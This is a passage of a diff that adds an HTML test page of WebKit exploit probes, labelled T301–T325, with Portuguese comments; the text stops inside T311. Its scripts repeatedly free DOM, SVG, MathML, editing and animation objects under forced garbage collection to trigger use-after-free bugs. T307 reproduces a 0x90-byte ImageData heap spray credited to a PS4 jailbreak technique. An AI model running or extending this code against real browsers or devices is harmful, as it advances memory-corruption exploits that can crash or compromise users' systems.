@@ -1,0 +1,2076 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8">
+<title>Testes13 — content-visibility UAF / SVGUseElement / execCommand / MathML / ImageData spray</title>
+</head>
+<body>
+
+<p><strong>TESTES13 — VETORES RECENTES / DOCUMENTADOS (T301-T325):</strong><br>
+T301: content-visibility UAF (Dark-life944 PoC documentado, Layer Tree recompute)<br>
+T302-303: SVGUseElement href change + shadow tree UAF<br>
+T304-305: contenteditable + execCommand + DOM mutation + GC<br>
+T306: MathML stress (WebKit 2014 era — região muito bugada)<br>
+T307: ImageData 0x90 spray EXATO (técnica SpecterDev setAttributeNodeNS)<br>
+T308: picture/source srcset change + GC<br>
+T309: Web Animations API cancel + GC<br>
+T310: CSS clip-path path() + mutation<br>
+T311: SVGFilter feBlend/feComposite + elemento removido<br>
+T312: details/summary toggle + GC durante open<br>
+T313: CSS content-visibility auto + contain-intrinsic-size + GC<br>
+T314: HTMLImageElement.decode() Promise + GC<br>
+T315: CSS @layer + insertRule/deleteRule<br>
+T316: SVG clipPath + use reference cycle + remoção<br>
+T317: CSS Grid recalc + remoção de item durante layout<br>
+T318: AbortController + fetch abort + GC<br>
+T319: HTMLTableElement createCaption/deleteCaption + GC<br>
+T320: Element.computedStyleMap() + remoção<br>
+T321: :scope pseudo-class + querySelectorAll + DOM mutation<br>
+T322: HTMLTableElement createTBody + mutation durante iteração<br>
+T323: CSS custom property + animation + GC<br>
+T324: Proxy + Reflect.ownKeys + GC (LLInt GetByVal novel pattern)<br>
+T325: STRESS FINAL — content-visibility + SVGUse + MathML + ImageData spray + execCommand</p>
+
+<div id="container13" class="container" style="display:none">
+  <div id="child13" class="child" style="width:50px;height:50px;background:blue"></div>
+</div>
+<div id="dom13" style="display:none"></div>
+<div id="svg13" style="display:none"></div>
+<div id="math13" style="display:none"></div>
+<div id="edit13" contenteditable="true" style="display:none;min-height:20px;border:1px solid gray">edit area</div>
+
+<button onclick="runAll()">RODAR TODOS</button><br><br>
+<button onclick="t301()">T301</button>
+<button onclick="t302()">T302</button>
+<button onclick="t303()">T303</button>
+<button onclick="t304()">T304</button>
+<button onclick="t305()">T305</button>
+<button onclick="t306()">T306</button>
+<button onclick="t307()">T307</button>
+<button onclick="t308()">T308</button>
+<button onclick="t309()">T309</button>
+<button onclick="t310()">T310</button>
+<button onclick="t311()">T311</button>
+<button onclick="t312()">T312</button>
+<button onclick="t313()">T313</button>
+<button onclick="t314()">T314</button>
+<button onclick="t315()">T315</button>
+<button onclick="t316()">T316</button>
+<button onclick="t317()">T317</button>
+<button onclick="t318()">T318</button>
+<button onclick="t319()">T319</button>
+<button onclick="t320()">T320</button>
+<button onclick="t321()">T321</button>
+<button onclick="t322()">T322</button>
+<button onclick="t323()">T323</button>
+<button onclick="t324()">T324</button>
+<button onclick="t325()">T325</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC idêntico ao PSFree / SpecterDev
+const MB = 1024 * 1024;
+function gc(){
+  for(let i = 0; i < 0x10; i++) new Uint8Array(4 * MB);
+}
+function gcHeavy(){
+  for(let i = 0; i < 0x40; i++) new ArrayBuffer(0x1000000);
+}
+
+function runAll(){
+  log('=== RODAR TODOS T301-T325: inicio ===');
+  t301(); t302(); t303(); t304(); t305();
+  t306(); t307(); t308(); t309(); t310();
+  t311(); t312(); t313(); t314(); t315();
+  t316(); t317(); t318(); t319(); t320();
+  t321(); t322(); t323(); t324(); t325();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// ─── T301 ─────────────────────────────────────────────────────────────────────
+// content-visibility: hidden → auto EXATO (Dark-life944 PoC documentado)
+// PoC original em https://dark-life944.github.io/poc/
+// WebKit::RenderLayerCompositor layer tree recomputation UAF:
+// 1) container.style['content-visibility'] = 'hidden' → layer freed from render tree
+// 2) container.removeChild(child) → RenderObject do child liberado
+// 3) Delay → container.style['content-visibility'] = 'auto' → recomputa layer tree
+// 4) Layer tree tenta acessar o RenderObject do child já liberado = UAF
+// Extensão: MutationObserver re-triggera o UAF a cada mudança no container.
+function t301(){
+  log('Teste 301: inicio');
+  try {
+    const container = document.getElementById('container13');
+    const child     = document.getElementById('child13');
+    if(!container || !child) throw new Error('elementos nao encontrados');
+
+    container.style.display = 'block';
+
+    // MutationObserver que re-triggera o UAF a cada mutação (igual ao PoC)
+    const mo301 = new MutationObserver(function(records){
+      gc(); // GC durante callback do MutationObserver
+      try {
+        // Alternar content-visibility para forçar recomputa repetida do layer tree
+        container.style['content-visibility'] = 'hidden';
+        gc();
+        container.style['content-visibility'] = 'auto';
+        gc();
+      } catch(e){}
+    });
+    mo301.observe(container, { childList: true, subtree: true, attributes: true });
+
+    // Spray com Uint8Array (idêntico ao PoC original)
+    const spray301 = [];
+    for(let i = 0; i < 0x10000; i++){
+      spray301.push(new Uint8Array(0x90)); // mesmo tamanho do iframe no PS4 (SpecterDev)
+    }
+
+    // Sequência do PoC:
+    try {
+      container.style['content-visibility'] = 'hidden'; // [1] libera layer do child
+      gc();
+
+      if(child.parentNode){
+        container.removeChild(child); // [2] RenderObject do child liberado
+        gc();
+      }
+
+      // [3] Restaurar → layer tree recomputa → acessa RenderObject liberado
+      container.style['content-visibility'] = 'auto';
+      gc();
+      let _ = container.offsetHeight; // forçar layout completo
+
+      // Re-inserir child (agora no novo slot de memória que pode ter sido reclamado)
+      container.appendChild(child);
+      gc();
+
+      // Repetir o ciclo para aumentar probabilidade
+      for(let i = 0; i < 15; i++){
+        try {
+          container.style['content-visibility'] = 'hidden';
+          gc();
+          if(child.parentNode) container.removeChild(child);
+          gc();
+          container.style['content-visibility'] = 'auto';
+          _ = container.offsetHeight;
+          gc();
+          container.appendChild(child);
+        } catch(e){}
+      }
+    } catch(e){}
+
+    mo301.disconnect();
+    container.style.display = 'none';
+    container.style['content-visibility'] = '';
+  } catch(e){}
+  log('Teste 301: fim');
+}
+
+// ─── T302 ─────────────────────────────────────────────────────────────────────
+// SVGUseElement: href change + shadow tree invalidation + GC
+// SVGUseElement clona o alvo em uma shadow tree; mudar o href invalida e
+// reconstrói a shadow tree. Se o alvo for removido durante o clone, o
+// SVGUseElement tem stale ptr para o shadow tree host.
+function t302(){
+  log('Teste 302: inicio');
+  try {
+    const svgNS = 'http://www.w3.org/2000/svg';
+    const area  = document.getElementById('svg13');
+    area.style.display = 'block';
+
+    // Criar SVG com símbolos alvo e elementos <use>
+    const svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+    svg.style.display = 'block';
+
+    // Definir símbolos que <use> vai referenciar
+    const symbols = [];
+    for(let i = 0; i < 10; i++){
+      const sym = document.createElementNS(svgNS, 'symbol');
+      sym.id = 'sym13_' + i;
+      sym.setAttribute('viewBox', '0 0 50 50');
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '50');
+      rect.setAttribute('height', '50');
+      rect.setAttribute('fill', 'hsl(' + (i * 36) + ',70%,50%)');
+      sym.appendChild(rect);
+      svg.appendChild(sym);
+      symbols.push(sym);
+    }
+
+    // Criar elementos <use> que referenciam os símbolos
+    const uses = [];
+    for(let i = 0; i < 10; i++){
+      const use = document.createElementNS(svgNS, 'use');
+      use.setAttribute('href', '#sym13_' + i);
+      use.setAttribute('x', (i % 5) * 40);
+      use.setAttribute('y', Math.floor(i / 5) * 40);
+      svg.appendChild(use);
+      uses.push(use);
+    }
+
+    area.appendChild(svg);
+    let _ = svg.getBoundingClientRect(); // forçar layout + shadow tree creation
+
+    // Mudar href dos <use> em loop + remover símbolo alvo + GC
+    for(let round = 0; round < 20; round++){
+      try {
+        const useEl = uses[round % uses.length];
+        const oldTargetId = 'sym13_' + (round % symbols.length);
+        const newTargetId = 'sym13_' + ((round + 1) % symbols.length);
+
+        // Mudar href → invalida shadow tree existente
+        useEl.setAttribute('href', '#' + newTargetId);
+        gc(); // GC durante invalidação da shadow tree
+
+        // Remover o símbolo ANTIGO enquanto shadow tree ainda pode ter referência
+        const oldSym = symbols[round % symbols.length];
+        if(oldSym.parentNode){
+          svg.removeChild(oldSym);
+          gc(); // GC: SVGUseElement tem stale ptr para shadow tree do sym removido
+          // Tentar acessar propriedades do <use> após remoção do alvo
+          try { useEl.getAttribute('href'); } catch(e){}
+          try { useEl.getBoundingClientRect(); } catch(e){}
+          // Re-inserir
+          svg.insertBefore(oldSym, svg.firstChild);
+        }
+
+        // Mudar de volta para o original
+        useEl.setAttribute('href', '#' + oldTargetId);
+        _ = svg.getBoundingClientRect(); // forçar re-clone da shadow tree
+        gc();
+      } catch(e){}
+    }
+
+    area.removeChild(svg);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 302: fim');
+}
+
+// ─── T303 ─────────────────────────────────────────────────────────────────────
+// SVGUseElement: ciclo de referência + remoção + GC (ciclo A→B→A)
+// <use href="#B"> onde B contém <use href="#A"> → ciclo de referência
+// WebKit deve detectar o ciclo e não entrar em loop infinito, mas
+// em versões antigas pode ter stack overflow ou UAF na detecção.
+function t303(){
+  log('Teste 303: inicio');
+  try {
+    const svgNS = 'http://www.w3.org/2000/svg';
+    const area  = document.getElementById('svg13');
+    area.style.display = 'block';
+
+    const svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '100');
+    svg.setAttribute('height', '100');
+
+    // Definir A e B que se referenciam mutuamente
+    const symA = document.createElementNS(svgNS, 'symbol');
+    symA.id = 'cycleA13';
+    const useAtoB = document.createElementNS(svgNS, 'use');
+    useAtoB.setAttribute('href', '#cycleB13');
+    symA.appendChild(useAtoB);
+    svg.appendChild(symA);
+
+    const symB = document.createElementNS(svgNS, 'symbol');
+    symB.id = 'cycleB13';
+    const useBtoA = document.createElementNS(svgNS, 'use');
+    useBtoA.setAttribute('href', '#cycleA13');
+    symB.appendChild(useBtoA);
+    svg.appendChild(symB);
+
+    // <use> raiz que aciona o ciclo
+    const useRoot = document.createElementNS(svgNS, 'use');
+    useRoot.setAttribute('href', '#cycleA13');
+    svg.appendChild(useRoot);
+
+    area.appendChild(svg);
+    try { let _ = svg.getBoundingClientRect(); } catch(e){} // tenta resolver o ciclo
+    gc();
+
+    // Remover um dos símbolos durante a resolução do ciclo
+    for(let i = 0; i < 10; i++){
+      try {
+        svg.removeChild(symA);
+        gc();
+        svg.appendChild(symA);
+        gc();
+        let _ = svg.getBoundingClientRect();
+        gc();
+      } catch(e){}
+    }
+
+    // Ciclos mais profundos (chain A→B→C→A)
+    const chainSyms = [];
+    for(let i = 0; i < 5; i++){
+      const sym = document.createElementNS(svgNS, 'symbol');
+      sym.id = 'chain13_' + i;
+      const useNext = document.createElementNS(svgNS, 'use');
+      useNext.setAttribute('href', '#chain13_' + ((i + 1) % 5));
+      sym.appendChild(useNext);
+      svg.appendChild(sym);
+      chainSyms.push(sym);
+    }
+    const useChainRoot = document.createElementNS(svgNS, 'use');
+    useChainRoot.setAttribute('href', '#chain13_0');
+    svg.appendChild(useChainRoot);
+    try { let _ = svg.getBoundingClientRect(); } catch(e){}
+    gc();
+    // Remover um elo do ciclo durante resolução
+    for(let i = 0; i < 5; i++){
+      try {
+        svg.removeChild(chainSyms[i]);
+        gc();
+        svg.appendChild(chainSyms[i]);
+        gc();
+      } catch(e){}
+    }
+
+    area.removeChild(svg);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 303: fim');
+}
+
+// ─── T304 ─────────────────────────────────────────────────────────────────────
+// contenteditable + execCommand + DOM mutation + GC (EditCommand UAF)
+// execCommand cria objetos EditCommand em fastMalloc e os empurra para o
+// undo stack; se o elemento editável for removido durante execCommand,
+// o EditCommand tem stale ptr para o documento/editor.
+function t304(){
+  log('Teste 304: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const editDiv = document.createElement('div');
+    editDiv.contentEditable = 'true';
+    editDiv.innerHTML = 'Some <b>bold</b> text with <i>italic</i> and <u>underline</u> content here.';
+    area.appendChild(editDiv);
+
+    // Selecionar todo o conteúdo
+    function selectAll(el){
+      try {
+        const sel = window.getSelection();
+        const range = document.createRange();
+        range.selectNodeContents(el);
+        sel.removeAllRanges();
+        sel.addRange(range);
+      } catch(e){}
+    }
+
+    // Comandos execCommand que exercitam diferentes EditCommands C++
+    const commands = [
+      ['bold',        null,      null],
+      ['italic',      null,      null],
+      ['underline',   null,      null],
+      ['strikeThrough', null,    null],
+      ['fontSize',    false,     '4'],
+      ['foreColor',   false,     '#ff0000'],
+      ['backColor',   false,     '#ffff00'],
+      ['justifyLeft', null,      null],
+      ['justifyCenter', null,    null],
+      ['insertText',  false,     'injected_text'],
+      ['formatBlock', false,     'h2'],
+      ['formatBlock', false,     'p'],
+      ['insertHTML',  false,     '<span style="color:blue">html_inject</span>'],
+      ['removeFormat', null,     null],
+    ];
+
+    for(let [cmd, showUI, val] of commands){
+      try {
+        selectAll(editDiv);
+        gc();
+        // Executar o comando
+        let result = (val !== null && val !== undefined)
+          ? document.execCommand(cmd, showUI || false, val)
+          : document.execCommand(cmd);
+        gc(); // GC após execCommand — EditCommand no undo stack pode ter stale ptrs
+      } catch(e){}
+    }
+
+    // Executar execCommand + remover editável ao mesmo tempo
+    for(let [cmd, showUI, val] of commands.slice(0, 5)){
+      try {
+        const tempEdit = document.createElement('div');
+        tempEdit.contentEditable = 'true';
+        tempEdit.innerHTML = 'temp_edit_content_' + cmd;
+        area.appendChild(tempEdit);
+
+        selectAll(tempEdit);
+        gc();
+
+        // Remover durante (antes de) execCommand — EditCommand terá stale ptr
+        area.removeChild(tempEdit);
+        gc();
+        try {
+          if(val !== null && val !== undefined)
+            document.execCommand(cmd, showUI || false, val);
+          else
+            document.execCommand(cmd);
+        } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Undo/Redo (acessa EditCommand do undo stack)
+    for(let i = 0; i < 10; i++){
+      try { document.execCommand('undo'); gc(); } catch(e){}
+      try { document.execCommand('redo'); gc(); } catch(e){}
+    }
+
+    try { area.removeChild(editDiv); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 304: fim');
+}
+
+// ─── T305 ─────────────────────────────────────────────────────────────────────
+// execCommand('insertHTML') com HTML complexo + GC (parser re-entrance UAF)
+// insertHTML dispara o parser HTML dentro do editor; se o parser for interrompido
+// por um GC, nós parcialmente construídos podem ser liberados.
+function t305(){
+  log('Teste 305: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const editDiv = document.createElement('div');
+    editDiv.contentEditable = 'true';
+    editDiv.textContent = 'placeholder';
+    area.appendChild(editDiv);
+    editDiv.focus();
+
+    // HTML complexo para inserção
+    const complexHTMLs = [
+      '<table><tr><td><table><tr><td>nested</td></tr></table></td></tr></table>',
+      '<ul>' + '<li>item_<b>bold</b></li>'.repeat(50) + '</ul>',
+      '<p>' + '<span style="color:red">'.repeat(20) + 'deep' + '</span>'.repeat(20) + '</p>',
+      '<div>' + new Array(100).fill('<span>s</span>').join('') + '</div>',
+      '<a href="javascript:void(0)">' + '<b><i><u>'.repeat(10) + 'link' + '</u></i></b>'.repeat(10) + '</a>',
+      '<blockquote><blockquote><blockquote>' + 'nested_quote '.repeat(100) + '</blockquote></blockquote></blockquote>',
+    ];
+
+    for(let html of complexHTMLs){
+      try {
+        // Selecionar tudo primeiro
+        const sel = window.getSelection();
+        if(sel){
+          const r = document.createRange();
+          r.selectNodeContents(editDiv);
+          sel.removeAllRanges();
+          sel.addRange(r);
+        }
+        document.execCommand('insertHTML', false, html);
+        gc();
+        // Acesso aos nós inseridos pós-GC
+        let nodes = editDiv.querySelectorAll('*');
+        for(let n of nodes){ try { n.textContent; } catch(e){} }
+        // Limpar para próxima iteração
+        editDiv.innerHTML = 'placeholder_' + complexHTMLs.indexOf(html);
+        gc();
+      } catch(e){}
+    }
+
+    // execCommand('delete') com seleção que engloba elementos complexos
+    try {
+      editDiv.innerHTML = '<div><p><b>delete</b> this <i>complex</i> <u>selection</u></p><p>second para</p></div>';
+      const sel2 = window.getSelection();
+      if(sel2){
+        const r2 = document.createRange();
+        r2.selectNodeContents(editDiv);
+        sel2.removeAllRanges();
+        sel2.addRange(r2);
+        document.execCommand('delete');
+        gc();
+      }
+    } catch(e){}
+
+    try { area.removeChild(editDiv); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 305: fim');
+}
+
+// ─── T306 ─────────────────────────────────────────────────────────────────────
+// MathML: estruturas complexas + GC (WebKit 2014-era muito bugada em MathML)
+// MathML usa RenderMathML* que são alocados em fastMalloc; estruturas inválidas
+// ou muito profundas podem causar crashes no render tree do MathML.
+function t306(){
+  log('Teste 306: inicio');
+  try {
+    const mathNS = 'http://www.w3.org/1998/Math/MathML';
+    const area   = document.getElementById('math13');
+    area.style.display = 'block';
+
+    function createMathEl(tag, text){
+      const el = document.createElementNS(mathNS, tag);
+      if(text) el.textContent = text;
+      return el;
+    }
+
+    // Estrutura MathML profundamente aninhada
+    const math = createMathEl('math');
+
+    // Fração profunda (mfrac dentro de mfrac)
+    function deepFrac(depth, text){
+      if(depth <= 0) return createMathEl('mn', text);
+      const frac = createMathEl('mfrac');
+      frac.appendChild(deepFrac(depth - 1, text + '_n'));
+      frac.appendChild(deepFrac(depth - 1, text + '_d'));
+      return frac;
+    }
+    try { math.appendChild(deepFrac(8, '1')); } catch(e){} // profundidade 8 → 2^8 = 256 nós
+
+    // mroot aninhado
+    const mrow = createMathEl('mrow');
+    for(let i = 0; i < 20; i++){
+      const mroot = createMathEl('mroot');
+      mroot.appendChild(createMathEl('mn', '' + i));
+      mroot.appendChild(createMathEl('mn', '2'));
+      mrow.appendChild(mroot);
+    }
+    math.appendChild(mrow);
+
+    // munder/mover com muitos elementos
+    const munder = createMathEl('munder');
+    munder.appendChild(createMathEl('mo', '\u222B')); // integral
+    const brace = createMathEl('mo');
+    brace.setAttribute('stretchy', 'true');
+    brace.textContent = '\uFE37'; // top brace
+    munder.appendChild(brace);
+    math.appendChild(munder);
+
+    // msubsup profundo
+    function deepSubSup(depth){
+      if(depth <= 0) return createMathEl('mi', 'x');
+      const mss = createMathEl('msubsup');
+      mss.appendChild(deepSubSup(depth - 1));
+      mss.appendChild(createMathEl('mn', '' + depth));
+      mss.appendChild(createMathEl('mn', '' + (depth * 2)));
+      return mss;
+    }
+    try { math.appendChild(deepSubSup(15)); } catch(e){}
+
+    // Adicionar ao DOM e forçar layout MathML
+    area.appendChild(math);
+    try { let _ = math.getBoundingClientRect(); gc(); } catch(e){}
+
+    // Mutar durante o layout MathML
+    const mathNodes = Array.from(math.querySelectorAll('*'));
+    for(let i = 0; i < mathNodes.length; i += 10){
+      try {
+        const node = mathNodes[i];
+        if(node && node.parentNode){
+          node.parentNode.removeChild(node);
+          gc(); // GC: RenderMathML* tem stale ptr
+          node.parentNode && node.parentNode.appendChild(node);
+        }
+      } catch(e){}
+    }
+
+    // Acessar propriedades pós-GC
+    try { let _ = math.getBoundingClientRect(); } catch(e){}
+    try { math.querySelectorAll('mfrac').length; }   catch(e){}
+
+    // Remover o math inteiro + GC + re-acesso
+    area.removeChild(math);
+    gcHeavy();
+    try { math.getBoundingClientRect(); } catch(e){} // stale ptr para RenderTree
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 306: fim');
+}
+
+// ─── T307 ─────────────────────────────────────────────────────────────────────
+// ImageData 0x90 spray EXATO (técnica SpecterDev para PS4 <= 5.02)
+// iframes no PS4 têm tamanho 0x90 no fastMalloc.
+// Spray com ImageData(1, 0x90/4) = ImageData(1, 36) → cada um ocupa exatamente
+// 0x90 bytes, preenchendo o mesmo bucket do fastMalloc que o iframe.
+// Após liberação do iframe (via setAttributeNodeNS ou similar), os ImageData
+// reclamam o slot — potencial type confusion quando o iframe é acessado.
+function t307(){
+  log('Teste 307: inicio');
+  try {
+    // Spray EXATO do SpecterDev: ImageData(1, 0x90/4) = ImageData(1, 36)
+    // Cada ImageData cria um Uint8Array de 1*36*4 = 144 bytes = 0x90
+    const objs307 = [];
+    const SPRAY_SIZE = 0x10000; // 65536 objetos — mesmo tamanho do PoC
+
+    // Fase 1: spray com ImageData (Uint8Array internamente)
+    for(let i = 0; i < SPRAY_SIZE; i++){
+      objs307.push(new ImageData(1, 0x90 / 4)); // 0x90/4 = 36 linhas
+    }
+    gc();
+
+    // Fase 2: converter para Uint32Array (como no PoC original)
+    // Isso permite acesso de 32 bits ao buffer de 144 bytes
+    const uint32s = [];
+    for(let i = 0; i < objs307.length; i++){
+      try {
+        uint32s.push(new Uint32Array(objs307[i].data.buffer));
+      } catch(e){}
+    }
+    gc();
+
+    // Fase 3: liberar metade dos ImageData — cria buracos de 0x90 no heap
+    for(let i = 0; i < objs307.length; i += 2){
+      objs307[i] = null;
+    }
+    gc();
+
+    // Fase 4: criar iframes que vão para os buracos de 0x90
+    const iframes307 = [];
+    for(let i = 0; i < 50; i++){
+      try {
+        const frm = document.createElement('iframe');
+        frm.src = 'about:blank';
+        document.body.appendChild(frm);
+        iframes307.push(frm);
+      } catch(e){}
+    }
+    gc();
+
+    // Fase 5: liberar iframes + GC → os slots são liberados novamente
+    for(let frm of iframes307){
+      try { document.body.removeChild(frm); } catch(e){}
+    }
+    gc();
+
+    // Fase 6: re-spray com novos ImageData para reclamar os slots dos iframes
+    for(let i = 0; i < objs307.length; i += 2){
+      try { objs307[i] = new ImageData(1, 0x90 / 4); } catch(e){}
+    }
+    gc();
+
+    // Fase 7: verificar se algum uint32 foi corrompido (indicador de heap overlap)
+    let corrupted = 0;
+    for(let u32 of uint32s){
+      try {
+        // Verificar os primeiros slots — se foram corrompidos pelo iframe, valores != 0
+        if(u32[0] !== 0 || u32[1] !== 0){ corrupted++; }
+      } catch(e){}
+    }
+
+    // Spray com tamanho 0x200 (JSObject típico em versões mais novas)
+    const objs307b = [];
+    for(let i = 0; i < 0x1000; i++){
+      objs307b.push(new ImageData(1, 0x200 / 4)); // 0x200/4 = 128 linhas
+    }
+    gc();
+    objs307b.length = 0;
+    gc();
+  } catch(e){}
+  log('Teste 307: fim');
+}
+
+// ─── T308 ─────────────────────────────────────────────────────────────────────
+// picture/source srcset change + GC (ImageLoader UAF)
+// HTMLPictureElement seleciona a melhor <source> baseado em srcset e media;
+// mudar srcset enquanto o ImageLoader está carregando pode causar UAF.
+function t308(){
+  log('Teste 308: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // Criar elementos <picture> com múltiplas sources
+    const pictures = [];
+    for(let i = 0; i < 10; i++){
+      const pic = document.createElement('picture');
+
+      // Sources com srcset e media queries diferentes
+      const sources = [
+        { srcset: 'data:image/png;base64,iVBORw0KGgo=', media: '(max-width: 600px)' },
+        { srcset: 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', media: '(max-width: 1200px)' },
+        { srcset: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgH', media: '(min-width: 1201px)' },
+      ];
+      for(let s of sources){
+        const src = document.createElement('source');
+        src.srcset = s.srcset;
+        src.media  = s.media;
+        pic.appendChild(src);
+      }
+
+      const img = document.createElement('img');
+      img.src = 'data:image/png;base64,iVBORw0KGgo=';
+      img.alt = 'test_' + i;
+      pic.appendChild(img);
+
+      area.appendChild(pic);
+      pictures.push({ pic, sources: Array.from(pic.querySelectorAll('source')), img });
+    }
+
+    // Forçar carregamento
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mudar srcset durante carregamento + GC
+    for(let iter = 0; iter < 30; iter++){
+      for(let { pic, sources, img } of pictures){
+        try {
+          // Mudar srcset de todas as sources → ImageLoader recarrega
+          for(let src of sources){
+            src.srcset = 'data:image/png;base64,iVBORw0KGgo=' + iter;
+          }
+          gc(); // GC durante ImageLoader ativo
+
+          // Remover source durante carregamento
+          if(sources[0].parentNode){
+            pic.removeChild(sources[0]);
+            gc();
+            pic.insertBefore(sources[0], pic.firstChild);
+          }
+
+          // Acessar img.currentSrc pós-GC (pode ter stale ptr para source selecionada)
+          try { img.currentSrc; } catch(e){}
+          try { img.naturalWidth; img.naturalHeight; } catch(e){}
+        } catch(e){}
+      }
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 308: fim');
+}
+
+// ─── T309 ─────────────────────────────────────────────────────────────────────
+// Web Animations API: Element.animate() + cancel() + GC (AnimationEffect UAF)
+// animate() cria KeyframeEffect e Animation em fastMalloc;
+// cancelar durante o callback onfinish pode liberar Animation enquanto ainda ativo.
+function t309(){
+  log('Teste 309: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // Verificar disponibilidade
+    if(typeof Element.prototype.animate !== 'function'){
+      log('Teste 309: fim (sem Web Animations API)');
+      return;
+    }
+
+    const animEls = [];
+    const animations = [];
+
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'width:10px;height:10px;background:hsl(' + (i*18) + ',70%,50%);position:absolute;left:' + i + 'px;';
+      area.appendChild(el);
+      animEls.push(el);
+
+      try {
+        const anim = el.animate(
+          [
+            { transform: 'translateX(0px)', opacity: 1 },
+            { transform: 'translateX(100px)', opacity: 0 }
+          ],
+          { duration: 50 + i * 5, fill: 'forwards', iterations: Infinity }
+        );
+
+        anim.onfinish = function(){
+          gc(); // GC durante onfinish
+          try { anim.cancel(); } catch(e){} // cancelar durante callback
+          gc();
+          // Acessar anim pós-cancel
+          try { anim.currentTime; }       catch(e){}
+          try { anim.playState; }         catch(e){}
+          try { anim.effect; }            catch(e){}
+        };
+
+        anim.oncancel = function(){
+          gc();
+          // Remover elemento durante oncancel
+          try {
+            if(el.parentNode) el.parentNode.removeChild(el);
+            gc();
+          } catch(e){}
+          // Acessar anim do elemento removido
+          try { anim.currentTime; } catch(e){}
+        };
+
+        animations.push(anim);
+      } catch(e){}
+    }
+
+    gc();
+
+    // Pausar e cancelar animações em loop
+    for(let iter = 0; iter < 10; iter++){
+      for(let anim of animations){
+        try {
+          anim.pause();
+          gc();
+          anim.currentTime = iter * 10;
+          gc();
+          anim.play();
+          gc();
+        } catch(e){}
+      }
+    }
+
+    // Cancelar todas + GC + acessar pós-cancel
+    for(let anim of animations){
+      try { anim.cancel(); gc(); } catch(e){}
+    }
+    gcHeavy();
+    for(let anim of animations){
+      try { anim.currentTime; anim.playState; anim.effect; } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 309: fim');
+}
+
+// ─── T310 ─────────────────────────────────────────────────────────────────────
+// CSS clip-path: path() / polygon() + DOM mutation + GC (ClipPathOperation UAF)
+// clip-path cria um ClipPathOperation em fastMalloc; mudar o clip-path enquanto
+// o RenderObject está usando o ClipPathOperation pode causar UAF.
+function t310(){
+  log('Teste 310: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const clipEls = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'width:100px;height:100px;background:red;display:inline-block;';
+      el.textContent = 'clip_' + i;
+      area.appendChild(el);
+      clipEls.push(el);
+    }
+
+    // Forçar layout
+    let _ = area.offsetHeight;
+
+    // Mudar clip-path em loop com GC
+    const clipPaths = [
+      'polygon(0 0, 100% 0, 100% 100%, 0 100%)',
+      'polygon(50% 0%, 100% 100%, 0% 100%)',
+      'polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%)',
+      'circle(50% at 50% 50%)',
+      'ellipse(40% 30% at 50% 50%)',
+      'inset(10% 10% 10% 10% round 10px)',
+      'inset(0 0 0 0)',
+      'none',
+    ];
+
+    for(let iter = 0; iter < 30; iter++){
+      for(let el of clipEls){
+        try {
+          const clipPath = clipPaths[iter % clipPaths.length];
+          el.style.clipPath = clipPath;
+          gc(); // GC durante mudança do ClipPathOperation
+
+          // Remover elemento durante o clip-path ativo
+          if(iter === 15 && el.parentNode){
+            area.removeChild(el);
+            gc(); // GC: ClipPathOperation pode ter stale ptr para RenderObject
+            area.appendChild(el);
+          }
+
+          _ = area.offsetHeight; // forçar recalc
+        } catch(e){}
+      }
+    }
+
+    // Mudar clip-path + remover imediatamente + GC
+    for(let el of clipEls.slice(0, 5)){
+      try {
+        el.style.clipPath = 'circle(50%)';
+        if(el.parentNode) area.removeChild(el);
+        gc();
+        // Tentar acessar el pós-remoção e pós-GC
+        el.style.clipPath;
+        area.appendChild(el);
+      } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 310: fim');
+}
+
+// ─── T311 ─────────────────────────────────────────────────────────────────────
+// SVGFilter: feBlend/feComposite/feTurbulence + elemento removido + GC
+// SVGFilterPrimitiveStandardAttributes são alocados em fastMalloc;
+// remover o elemento com filtro durante a renderização pode causar UAF.
+function t311(){
+  log('Teste 311: inicio');
+  try {
+    const svgNS = 'http://www.w3.org/2000/svg';
+    const area  = document.getElementById('svg13');
+    area.style.display = 'block';
+
+    const svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+
+    // Definir filtros complexos com múltiplas primitivas
+    const defs = document.createElementNS(svgNS, 'defs');
+
+    function createFilter(id, primitives){
+      const filter = document.createElementNS(svgNS, 'filter');
+      filter.id = id;
+      for(let [tag, attrs] of primitives){
+        const prim = document.createElementNS(svgNS, tag);
+        for(let [k, v] of Object.entries(attrs)) prim.setAttribute(k, v);
